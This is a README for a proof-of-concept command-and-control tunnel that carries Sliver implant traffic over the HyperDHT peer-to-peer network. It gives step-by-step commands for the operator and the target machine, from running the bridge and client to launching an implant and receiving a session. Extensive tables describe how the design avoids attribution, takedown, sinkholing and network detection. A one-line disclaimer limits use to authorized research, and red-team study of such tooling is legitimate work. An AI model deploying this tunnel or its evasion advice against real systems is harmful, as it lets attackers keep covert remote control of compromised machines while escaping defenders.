# GhostShip

## P2P Tunnel for C2 Traffic

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)

---

## Overview

**GhostShip** is a proof-of-concept peer-to-peer (P2P) tunnel designed to transport C2 traffic (such as [Sliver](https://github.com/BishopFox/sliver)) through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.

By utilizing [HyperDHT](https://docs.pears.com/building-blocks/hyperdht) from the [Pear](https://pears.com/) / [Holepunch](https://holepunch.to/) ecosystem, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, bypassing the need for public IPs, static domains, or traditional VPS infrastructure.

> **This is a Proof of Concept (PoC)** — GhostShip demonstrates the feasibility of P2P-based C2 tunneling. It is not intended for production use.

---

## How It Works

```
[Target Machine]                              [Operator Machine]

  C2 Implant                                    C2 Server
  (e.g., Sliver)                               (e.g., Sliver)
       |                                            |
       v                                            v
  127.0.0.1:8888                              127.0.0.1:8888
       |                                            |
       v                                            v
  GhostShip Client  <------P2P/DHT------>  GhostShip Bridge
```

**Data Flow:**
1. Operator starts their C2 server (e.g., Sliver with mTLS listener on port 8888)
2. Operator runs the **Bridge**, which connects to the local C2 server and exposes it via HyperDHT
3. Bridge generates a connection key (`hs://...`)
4. On the target, the **Client** connects to the DHT using the connection key
5. Client opens a local TCP port (default: 8888) for the implant to connect to
6. C2 implant connects to `127.0.0.1:8888` and traffic flows through the P2P tunnel

---

## Traditional C2 vs P2P C2

### Architecture Comparison

| Aspect | Traditional C2 | P2P C2 (GhostShip) |
|--------|---------------|---------------------|
| **Topology** | Star (clients → central server) | Mesh (peer-to-peer via DHT) |
| **Infrastructure** | VPS, domains, static IPs required | Zero infrastructure - DHT is public |
| **Single Point of Failure** | Server takedown = total loss | No central server to seize |
| **Attribution Risk** | Domain WHOIS, IP registration, hosting provider logs | DHT provides anonymity layer |
| **Cost** | $10-100+/month (VPS, domains, CDN) | Free (leverages existing DHT network) |
| **Setup Time** | Hours/days (provisioning, DNS propagation) | Seconds (generate key, connect) |
| **Scalability** | Limited by server capacity | Scales naturally with DHT |

### Operational Security

| Factor | Traditional C2 | P2P C2 |
|--------|---------------|--------|
| **Domain Fronting** | Often required for stealth | Not needed - no domains |
| **IP Rotation** | Manual or requires infrastructure | Automatic via DHT routing |
| **Sinkholing** | Domains can be seized | No DNS = nothing to sinkhole |
| **Traffic Analysis** | Recognizable C2 patterns to known IPs | Blends with Pear/Keet app traffic |
| **Takedown Requests** | Single target (your server) | No central point to take down |
| **Geoblocking** | Server IP can be blocked | DHT nodes are globally distributed |

### Technical Capabilities

| Feature | Traditional C2 | P2P C2 |
|---------|---------------|--------|
| **NAT Traversal** | Requires port forwarding or redirectors | Built-in hole-punching |
| **Encryption** | Implementation-dependent | E2E by default (Noise protocol) |
| **Certificate Management** | Required for HTTPS/mTLS | Not needed - key-based identity |
| **Redundancy** | Requires multiple servers | Inherent in DHT mesh |
| **Offline Queuing** | Server can store commands | Both peers must be online |
| **Latency** | Direct connection (low) | DHT routing (variable) |

### Detection Surface

| Indicator | Traditional C2 | P2P C2 |
|-----------|---------------|--------|
| **Network IOCs** | Known IPs, domains | DHT bootstrap nodes only |
| **DNS Queries** | C2 domain lookups | No DNS queries for C2 |
| **Certificate Fingerprints** | TLS cert can be fingerprinted | No certificates exposed |
| **Beaconing Patterns** | Regular intervals to fixed IP | Distributed across DHT |
| **JA3/JA3S** | Fingerprintable TLS handshakes | Noise protocol (different signature) |

### When to Use Which

**Traditional C2 is better when:**
- You need store-and-forward (implant phones home, operator offline)
- Low latency is critical
- Target network blocks DHT bootstrap nodes
- You need complex multi-user teamserver features

**P2P C2 is better when:**
- Infrastructure cost/attribution is a concern
- Target has outbound internet but you can't expose a server
- Rapid deployment needed (no time for infrastructure setup)
- Resilience against takedowns is important
- Operating in hostile network environments

### Trade-offs Summary

| | Traditional | P2P |
|---|:---:|:---:|
| Setup complexity | Higher | Lower |
| Operational cost | Higher | None |
| Attribution risk | Higher | Lower |
| Latency | Lower | Higher |
| Offline support | Yes | No |
| Maturity/tooling | Established | Emerging |

---

## Components

| Component | Description |
|-----------|-------------|
| **Bridge** | Runs on the operator's machine. Connects local C2 server to HyperDHT. |
| **Client** | Runs on the target. Opens local port for implant, tunnels to bridge via DHT. |

---

## Quick Start

### 1. Operator Side

**Start your C2 server:**
```bash
# Example with Sliver
sliver-server
sliver > mtls --lport 8888
```

**Start the GhostShip Bridge:**
```bash
tar -xzf bridge-linux.tar.gz
./ghostship-bridge --port 8888
# Note the connection key: hs://abc123...
```

### 2. Target Side

**Start the GhostShip Client:**
```bash
tar -xzf client-linux.tar.gz
./ghostship-client --connect "hs://abc123..." --port 8888
```

**Run your C2 implant configured to connect to `127.0.0.1:8888`:**
```bash
# Example: Sliver implant generated with:
# generate --mtls 127.0.0.1:8888 --os linux --arch amd64
./implant
```

### 3. Receive Session

```
sliver > sessions
```

---

## Releases

Pre-built bundles are available in [GitHub Releases](../../releases). Each bundle includes:
- Embedded Node.js runtime (no external dependencies)
- Launcher script

| File | Platform | Description |
|------|----------|-------------|
| `bridge-linux.tar.gz` | Linux x64 | Operator-side bridge |
| `bridge-windows.zip` | Windows x64 | Operator-side bridge |
| `client-linux.tar.gz` | Linux x64 | Target-side client |
| `client-windows.zip` | Windows x64 | Target-side client |

---

## Limitations

- **Not stealthy**: The client opens a visible local TCP port. Network connections to DHT bootstrap nodes are visible.
- **Requires implant cooperation**: Your C2 implant must be configured to connect to `127.0.0.1:<port>`.
- **Bridge must be running**: No persistence or queuing - both sides must be online.
- **PoC quality**: Not optimized for reliability or performance.

---

## Project Structure

```
ghostship/
├── bridge/
│   └── nodejs/
│       ├── bridge.js        # Bridge implementation
│       └── package.json
├── client/
│   ├── client.js            # Client implementation
│   └── package.json
└── .github/
    └── workflows/
        └── release.yml      # CI/CD pipeline
```

---

## Disclaimer

This project is for **authorized security research and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## License

MIT License - See [LICENSE](LICENSE) for details.
